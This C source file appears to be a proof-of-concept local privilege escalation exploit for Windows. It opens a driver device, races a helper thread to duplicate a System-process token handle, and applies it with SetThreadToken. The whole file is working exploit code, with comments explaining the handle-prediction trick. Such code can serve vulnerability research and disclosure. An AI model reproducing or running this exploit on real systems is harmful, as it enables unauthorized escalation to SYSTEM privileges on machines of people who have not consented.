#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include "LMI-Common.h"

int main() {
	HANDLE hDupeThread = INVALID_HANDLE_VALUE;
	DWORD dwSuspendCount = 0;
	DWORD dwTid = 0;
	DUPE_THREAD_INFO dti = { 0 };

	HANDLE hToken = INVALID_HANDLE_VALUE;
	BOOL bRes = FALSE;

	const char* strDevName = R"(\\.\0123456789abcdef123456789abcdef)";
	HANDLE hDevice = CreateFileA(
		strDevName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (!hDevice) {
		printf("%s:%d - CreateFileA : %lx\n", __FILE__, __LINE__, GetLastError());
		return -1;
	}

	dti.hDevice = hDevice;
	dti.Run = TRUE;

	// Create the dupe thread suspended
	hDupeThread = CreateThread(NULL, 0x1000, (LPTHREAD_START_ROUTINE)DupeThread, &dti, CREATE_SUSPENDED, &dwTid);
	if (!hDupeThread) {
		puts("Failed to create dupe thread");
		return -1;
	}

	puts("Created dupe thread");


	// FindNextCreatedHandle counts the number of handles in the current process.
	// When the System (pid 4) process is opened in the current thread,
	// the duplicated handle will, for a short time, be FindNextCreatedHandle() + 4
	//
	// Yes, I could use NtQueryInformationProcess to get a handle snapshot but 
	// that would be slow and I am too lazy to do that.
	// Plus, I already did that in a previous POC and I don't care to copy/paste.
	//
	// As such all handles you are going to use in your POC MUST be created/opened
	// BEFORE CALLING FindNextCreatedHandle!!!
	//
	// If not done, the handle calculation will be off, it will not work, and 
	// it will bring shame upon my house.
	HANDLE hTarget = FindNextCreatedHandle();
	hTarget = (HANDLE)((UINT64)hTarget + 4);
	puts("press key UwU");
	getchar();
	puts("Resuming dupe thread");
	dwSuspendCount = ResumeThread(hDupeThread);
	if (dwSuspendCount == -1) {
		printf("Error resuming dupe thread - %lx\n", GetLastError());
		return -1;
	}

	while (!bRes) {
		bRes = DuplicateHandle(g_hCurrentProc, hTarget, g_hCurrentProc, &hToken, NULL, FALSE, DUPLICATE_SAME_ACCESS);
	}

	dti.Run = FALSE;

	if (bRes) {
		puts("ebin");
		printf("%llx - target\n", hTarget);
		printf("%llx - dup\n", hToken);
		bRes = SetThreadToken(NULL, hToken);
		if (!bRes) {
			printf("Failed to SetThreadToken - %x\nExploitation failed!", GetLastError());
		}
		else {
			puts("Set the thread token!");
		}
	}
	else {
		printf("Failed to dupe token: %lx\n", GetLastError());
		return -1;
	}

	getchar();
	return 0;
}